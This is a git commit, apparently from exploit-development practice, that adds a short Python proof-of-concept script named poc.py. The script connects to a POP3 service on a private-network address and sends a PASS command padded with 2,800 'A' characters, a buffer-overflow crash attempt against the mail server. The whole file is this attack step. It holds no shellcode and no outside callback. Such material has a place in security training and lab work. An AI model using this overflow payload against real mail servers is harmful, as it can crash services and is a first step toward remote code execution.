95ade7df43405831d25243043616cb193c14a8c0
Eduardo Barbosa (Anakein) <37910997+e-anakein@users.noreply.github.com>
2018-12-15 13:18:32 -0300

    Create poc.py
    dev connect socket

---
+++ poc.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python
+# by Anakein
+import socket
+
+
+buf = 'A'*2800
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('10.0.1.104',110))
+
+s.send('USER anakein \r\n')
+s.recv(1024)
+
+s.send('PASS ' +buf+ '\r\n')
+s.recv(1024)
+
+s.close()
